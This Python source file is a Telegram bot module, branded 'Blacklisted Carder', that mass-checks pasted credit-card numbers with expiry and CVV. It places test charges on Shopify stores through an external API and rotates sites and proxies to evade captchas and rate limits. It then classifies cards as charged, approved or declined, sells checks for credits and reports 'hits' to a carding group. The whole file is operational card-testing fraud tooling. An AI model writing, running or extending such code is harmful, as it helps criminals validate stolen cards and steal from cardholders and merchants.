import asyncio
import aiohttp
import re
import time
import json
import html
import random
import logging
import os
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_collection, load_global_proxies_http
from bin import get_bin_info
from sub import get_premium_status, ADMIN_IDS
from shopify_api import call_shopify_api

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "https://shopify-api-production-00.up.railway.app/check"

SITES_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "mass_gates", "sites.txt")

PROXY_LIST = load_global_proxies_http()

MAX_MASS_CARDS = 50
PARALLEL_LIMIT = 20
MAX_RETRIES = 1
MAX_SITE_ROTATIONS = 20
UPDATE_EVERY = 10

SH_SESSIONS = {}

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# Hit log group — fallback numeric — overridden by resolver at startup
HIT_LOG_GROUP_ID = -1003911344323
HIT_LOG_GROUP_HANDLE = "@blackulogs"

# Premium Emoji IDs (provided by owner)
EMOJI_RED_TICK   = "6147565374289220368"
EMOJI_BLUE_TICK  = "5278628026416909103"
EMOJI_LIGHTNING  = "5219745609631674840"
EMOJI_STAR       = "5359686514697576863"
EMOJI_FIRE       = "6186076099764555777"
EMOJI_CROWN      = "6338940587193930733"
EMOJI_EPIC       = "6052994304715002242"
EMOJI_DRAGON     = "5440636718262804952"
EMOJI_GUN        = "5440406404936524730"
EMOJI_WHITE_STAR = "5247131412032670246"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# MongoDB is schema-less — no column migration needed
def update_user_stats_sync(user_id, checked_count, charged_count):
    col = get_collection("users")
    inc = {"cc_checked": checked_count}
    if charged_count > 0:
        inc["cc_charged"] = charged_count
    col.update_one({"user_id": user_id}, {"$inc": inc})
async def get_user_plan_name(user_id):
    # Admins always appear as Root regardless of DB state
    if user_id in ADMIN_IDS:
        return "Root"
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            users_col = get_collection("users")
            receipts_col = get_collection("receipts")
            doc = receipts_col.find_one({"user_id": user_id}, sort=[("purchased_on", -1)])
            if doc and doc.get("plan"):
                return str(doc["plan"]).upper()
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"


def _build_user_link_html(user_id: int, name: str) -> str:
    safe_name = html.escape(name or "User")
    return f'<a href="tg://user?id={user_id}">{safe_name}</a>'


async def _log_charged_hits_to_group(bot, results: list, user_id: int, user_name: str, plan_name: str):
    """Backward-compatible entrypoint — delegates to lightweight notification.

    The full CC details are NO LONGER sent to HIT_LOG_GROUP_ID (security
    regression — the CC#s at rest in the GC could leak). Only a brief
    "Hit Detected" notice with user + charge count is sent.
    """
    charged = [
        r for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    ]
    if not charged:
        return
    await _log_hit_notification_to_group(
        bot, user_id, user_name, plan_name, charged_count=len(charged),
    )


async def _log_hit_notification_to_group(
    bot,
    user_id: int,
    user_name: str,
    plan_name: str,
    charged_count: int,
):
    """Send a lightweight "Hit Detected" notification to HIT_LOG_GROUP_ID.

    NO credit card number, NO response, NO BIN info is shared — only the
    user identity + how many cards charged. Keeps the GC aware of incoming
    hits without leaking sensitive card data into a less-secured channel.
    """
    try:
        user_link = _build_user_link_html(user_id, user_name)
        safe_plan = html.escape(plan_name or "—")

        # Plan badge — skip TRIAL/Free
        plan_badge = ""
        plan_lower = str(plan_name or "").strip().lower()
        if plan_lower and plan_lower not in ("trial", "free", "none", "—"):
            plan_badge = f' <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> <i>{safe_plan}</i>'

        caption = (
            f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> '
            f'<b>Hit Detected</b> '
            f'<tg-emoji emoji-id="{EMOJI_EPIC}">✨</tg-emoji> '
            f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> '
            f'<b><a href="https://t.me/blacklistedcarder1">Blacklisted Carder</a></b>\n'
            f"━━━━━━━━━━━━━━━━\n"
            f'👤 <b>𝗨𝘀𝗲𝗿 ➛</b> {user_link}{plan_badge}\n'
            f'🔥 <b>Charged ➛</b> <code>{charged_count}</code> '
            f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>\n'
            f'⚡ <b>𝗚𝗮𝘁𝗲 ➛</b> <code>sh</code>\n'
            f"━━━━━━━━━━━━━━━━\n"
            f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> '
            f'<b><a href="https://t.me/blacklistedcarder1">@blacklistedcarder1</a></b>'
        )
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        logging.error(f"[SH] Could not log hit notification to group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GENERAL HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logger = logging.getLogger(__name__)

def load_sites() -> List[str]:
    try:
        if not os.path.exists(SITES_FILE):
            return []
        with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        exp_year = int(yy)
        exp_month = int(mm)
        current_year = now.year % 100
        if exp_year < current_year:
            return True
        if exp_year == current_year and exp_month < now.month:
            return True
        return False
    except ValueError:
        return True

def parse_card(text: str) -> Optional[Tuple[str, str, str, str]]:
    text = text.strip()
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        cc, mm, yy, cvv = match.groups()
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        return cc, mm, yy, cvv
    return None

def extract_cards(raw_text: str) -> List[str]:
    cards = []
    for line in raw_text.split('\n'):
        data = parse_card(line)
        if data:
            cc, mm, yy, cvv = data
            cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards[:MAX_MASS_CARDS]

def get_sort_priority(response_text: str) -> int:
    resp = response_text.upper()
    if any(k in resp for k in ["ORDER_PLACED", "CHARGED", "ORDER_PAID", "THANK YOU"]):
        return 1
    if "3DS" in resp or "3D_AUTH" in resp or "INSUFFICIENT_FUNDS" in resp or "INVALID_CVC" in resp:
        return 2
    return 3

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE CHECKING LOGIC  (new API + proxy rotation)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Responses that mean "try a different site / proxy" — not a real card decline
ROTATION_TRIGGERS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]

async def check_card_logic(sites: List[str], cc: str) -> Dict:
    bin_num = cc.split('|')[0][:6]

    try:
        bin_data = await get_bin_info(bin_num)
        brand = (bin_data.get("scheme") or "N/A").title()
        issuer = bin_data.get("bank") or "N/A"
        country = bin_data.get("country") or "Unknown"
        flag = bin_data.get("country_emoji", "")
        bin_info = f"{issuer}|{country}{flag}"
        # Stash full bin dict so hit-log caption can render rich BIN section
        _bin_full = bin_data
    except Exception:
        brand = "N/A"
        bin_info = "Unknown|Unknown"
        _bin_full = {"scheme": "N/A", "bank": "N/A", "country": "N/A", "country_emoji": ""}

    declined_sym = f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'

    last_site = None

    def _safe_proxy(p: str) -> bool:
        """Same defensive check used in msh.py — reject any proxy URL
        that the backend would parse as malformed (e.g. host='http')."""
        if not p or not isinstance(p, str) or not p.startswith('http://'):
            return False
        rest = p[7:]
        if '@' not in rest:
            return False
        host_port = rest.rsplit('@', 1)[1]
        if ':' not in host_port:
            return False
        host, port = host_port.rsplit(':', 1)
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            return False
        host_lower = host.lower().strip()
        if not host_lower or host_lower in ('http', 'https', 'socks4', 'socks5'):
            return False
        return '.' in host_lower

    for _ in range(MAX_SITE_ROTATIONS):
        # Pick a site different from the last one if possible
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        # Pick a random proxy each rotation — skip any malformed entry
        for _attempt in range(min(50, len(PROXY_LIST))):
            proxy = random.choice(PROXY_LIST)
            if _safe_proxy(proxy):
                break
        else:
            logging.error("[sh] No safe proxy available in PROXY_LIST — aborting")
            return {
                "card": cc,
                "resp": "Proxy Error: No safe proxy available",
                "price": "N/A",
                "bin": bin_info,
                "brand": brand,
                "symbol": declined_sym,
                "_bin_full": _bin_full,
            }

        for retry_idx in range(MAX_RETRIES + 1):
            try:
                data = await call_shopify_api(
                    card=cc,
                    site=current_site,
                    proxy=proxy,
                    timeout=30,
                )

                raw_resp = (
                    data.get("error")
                    or data.get("declined_reason")
                    or data.get("response_text")
                    or data.get("status")
                    or "N/A"
                )
                raw_price = data.get("amount", "N/A")

                display_resp = (
                    str(raw_resp)
                    .replace("\\", "")
                    .replace("/", "")
                    .replace('"', '')
                    .replace("'", "")
                )

                price_display = "N/A"
                if raw_price not in ("N/A", None, ""):
                    try:
                        val = float(
                            str(raw_price).replace("USD", "").replace("$", "").strip()
                        )
                        price_display = f"${val} USD"
                    except ValueError:
                        price_display = str(raw_price)

                lower = display_resp.lower()
                upper = display_resp.upper()

                # ══════════════════════════════════════════════════════
                # STATUS CLASSIFICATION — Shopify1-style pattern
                # ══════════════════════════════════════════════════════

                # 1. CHARGED — "Charged USD X.XX" / "ORDER_PAID" / "THANK YOU"
                if (
                    "CHARGED" in upper
                    or "ORDER_PAID" in upper
                    or "ORDER_PLACED" in upper
                    or "THANK YOU" in upper
                ):
                    symbol = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'

                # 2. APPROVED — "Approved USD X.XX" / "INSUFFICIENT_FUNDS" /
                # "INCORRECT_CVC" / "INVALID_CVC" / "3DS" variants
                elif (
                    "APPROVED" in upper
                    or "INSUFFICIENT" in lower
                    or "INCORRECT_CVC" in upper
                    or "INVALID_CVC" in upper
                    or "3D_AUTHENTICATION" in upper
                    or "3DS_REQUIRED" in upper
                    or "3DS" in upper
                ):
                    symbol = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

                # 3. Everything else → DECLINED
                else:
                    symbol = declined_sym

                # If it's a rotation trigger, try next site
                needs_rotation = any(t in lower for t in ROTATION_TRIGGERS)
                if needs_rotation:
                    break  # break the retry loop, rotate site

                return {
                    "card": cc,
                    "resp": display_resp,
                    "price": price_display,
                    "bin": bin_info,
                    "brand": brand,
                    "symbol": symbol,
                    "_bin_full": _bin_full,
                }

            except aiohttp.ClientResponseError as e:
                if e.status == 429 and retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except (asyncio.TimeoutError, aiohttp.ClientConnectorError):
                if retry_idx < MAX_RETRIES:
                    await asyncio.sleep(1)
                    continue
                break
            except json.JSONDecodeError:
                break

    return {
        "card": cc,
        "resp": "Dead / Site Error",
        "price": "N/A",
        "bin": bin_info,
        "brand": brand,
        "symbol": declined_sym,
        "_bin_full": _bin_full,
    }

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sh"))
async def sh_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    if not await asyncio.to_thread(is_gate_enabled, "sh"):
        await message.reply(
            "🚧 <b>𝗠𝗮𝘀𝘀 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>",
            parse_mode="HTML"
        )
        return

    # ─── Credit check BEFORE doing anything expensive (premium = unlimited) ──
    is_prem, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_prem:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits is None or current_credits < 1:
            await message.reply(
                "❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
                "You need at least <b>1 credit</b> to use this gate.\n"
                "Contact <a href=\"https://t.me/blacklistedcarder1\">owner</a> for credits.",
                parse_mode="HTML"
            )
            return

    sites = load_sites()
    if not sites:
        await message.reply("❌ No sites found in <code>sites.txt</code>.", parse_mode="HTML")
        return

    # ─── Extract cards from command text or replied message ──────────
    raw_text = ""
    parts = message.text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1].strip() + "\n"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.text:
            raw_text += replied.text
        elif replied.caption:
            raw_text += replied.caption

    if not raw_text.strip():
        await message.reply(
            "⚠️ <b>Usage:</b> Reply to a message with cards or send\n"
            "<code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"
        )
        return

    # ─── Extract & deduplicate ───────────────────────────────────────
    extracted = extract_cards(raw_text)
    if not extracted:
        await message.reply("❌ No valid cards found.")
        return

    seen = set()
    unique_cards = []
    for card in extracted:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)

    # ─── Validate (Luhn + expiry) ────────────────────────────────────
    final_valid_cards = []
    luhn_fail_count = 0
    expired_count = 0

    for cc in unique_cards:
        p = cc.split('|')
        if len(p) < 4:
            continue
        cc_num, mm, yy, _ = p
        if not luhn_check(cc_num):
            luhn_fail_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        final_valid_cards.append(cc)

    if luhn_fail_count > 0 or expired_count > 0:
        removed = luhn_fail_count + expired_count
        await message.reply(
            f"ℹ️ <b>Removed:</b> {removed} invalid/expired cards.\n"
            f"Checking <b>{len(final_valid_cards)}</b> valid cards...",
            parse_mode="HTML"
        )

    if not final_valid_cards:
        await message.reply("❌ No valid cards to check after filtering.")
        return

    # ─── Check that user has enough credits for the whole batch (premium = unlimited) ───
    is_prem_batch, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_prem_batch:
        needed = len(final_valid_cards)
        if current_credits < needed:
            await message.reply(
                f"❌ <b>Not enough credits</b>\n\n"
                f"You need <b>{needed}</b> credits for this batch "
                f"but only have <b>{current_credits}</b>.\n"
                f"Contact <a href=\"https://t.me/blacklistedcarder1\">owner</a> to top up.",
                parse_mode="HTML"
            )
            return

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    asyncio.create_task(
        run_sh_check(message, sites, final_valid_cards, user_name, user_id, is_premium)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_sh_check(
    message: types.Message,
    sites: List[str],
    cards: List[str],
    user_name: str,
    user_id: int,
    is_premium: bool,
):
    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{user_name}</a>"

    status_msg = await message.reply(
        f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\">👑</tg-emoji> <b>𝗗𝗲𝘃 ➛ <a href=\"https://t.me/blacklistedcarder1\">Blacklisted Carder</a></b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"𝗖𝗮𝗿𝗱𝘀 ➛ <code>{total_cards}</code>\n"
        f"𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴...</b>",
        parse_mode="HTML",
        disable_web_page_preview=True,
    )
    msg_id = status_msg.message_id

    SH_SESSIONS[msg_id] = {
        "gate_name": "sh",
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
    }

    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(cc: str):
        async with sem:
            return await check_card_logic(sites, cc)

    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)

    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            try:
                res = task.result()
                results.append(res)
            except Exception as e:
                logger.error(f"Worker error: {e}")

        results.sort(key=lambda x: get_sort_priority(x["resp"]))

        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            SH_SESSIONS[msg_id]["results"] = results
            SH_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(SH_SESSIONS[msg_id], elapsed, is_working=True)
            if len(results) < total_cards:
                text += f"\n\n<tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(results)}/{total_cards}...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id, is_working=True))
            except Exception:
                pass

    elapsed_final = round(time.time() - start_time, 2)
    SH_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    # ─── Stats ───────────────────────────────────────────────────────
    charged_count = sum(
        1 for r in results
        if f'emoji-id="{CUSTOM_CHARGED_EMOJI_ID}"' in r.get("symbol", "")
    )
    await asyncio.to_thread(update_user_stats_sync, user_id, len(results), charged_count)

    # ─── Credit deduction: 1 credit per card checked (premium = unlimited) ───
    # Only count cards that got a real API response (not pure site errors)
    real_checked = sum(
        1 for r in results if r.get("resp", "").lower() != "dead / site error"
    )
    if real_checked > 0:
        is_prem, _ = await asyncio.to_thread(get_premium_status, user_id)
        if not is_prem:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)
            new_balance = max(0, current_credits - real_checked)
            await asyncio.to_thread(update_credits, user_id, new_balance)

    final_text = format_page_content(SH_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += f"\n\n<tg-emoji emoji-id=\"{EMOJI_BLUE_TICK}\">✅</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b> <tg-emoji emoji-id=\"{EMOJI_EPIC}\">✨</tg-emoji>"

    await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id, is_working=False))

    if charged_count > 0:
        try:
            await message.bot.pin_chat_message(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                disable_notification=True,
            )
        except Exception as pe:
            logging.warning(f"[SH] Could not pin charged result for user {user_id}: {pe}")

        plan_name = await get_user_plan_name(user_id)
        await _log_charged_hits_to_group(
            message.bot,
            results,
            user_id,
            user_name,
            plan_name,
        )


def format_page_content(state: Dict, elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * 6
    page_results = results[start_idx: start_idx + 6]

    user_link = f"<a href='tg://user?id={state['user_id']}'>{state['user_name']}</a>"

    text = (
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{len(results)}/{state['total_cards']}</code>\n"
        f"𝗧𝗶𝗺𝗲 ➛ <code>{elapsed}s</code>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        safe_resp = html.escape(res.get("resp", "UNKNOWN"))
        text += (
            f"\n<code>{res['card']}</code>\n"
            f"<b>{safe_resp}</b> {res.get('symbol', '')} <b>{res.get('price', 'N/A')}</b>\n"
            f"<b>{res['bin']}</b>\n"
            f"━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int, is_working: bool = True) -> Optional[InlineKeyboardMarkup]:
    """PHASE 2 MINIMAL: Only pagination buttons - NO count display buttons"""
    state = SH_SESSIONS.get(msg_id)
    if not state:
        return None

    buttons = []
    
    if is_working:
        # During check: No buttons
        return None
    else:
        # After check: Only pagination buttons (Back/Next)
        total = len(state["results"])
        pages = (total + 5) // 6
        current = state["page"]

        pagination_row = []
        if current > 0:
            pagination_row.append(InlineKeyboardButton(
                text="◀ Back",
                callback_data=f"sh_prev_{msg_id}"
            ))
        if current < pages - 1:
            pagination_row.append(InlineKeyboardButton(
                text="Next ▶",
                callback_data=f"sh_next_{msg_id}"
            ))
        
        if pagination_row:
            buttons.append(pagination_row)
@router.callback_query(F.data.startswith("sh_"))
async def sh_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        return
    try:
        msg_id = int(parts[2])
    except (ValueError, IndexError):
        return

    state = SH_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    await callback.answer()

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + 5) // 6

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))

    text = format_page_content(state, elapsed, is_working=False)
    if len(state["results"]) < state["total_cards"]:
        text += f"\n\n⏳ <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(state['results'])}/{state['total_cards']}...</b>"
    else:
        text += "\n\n✅ <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id, is_working=True))
    except Exception:
        pass
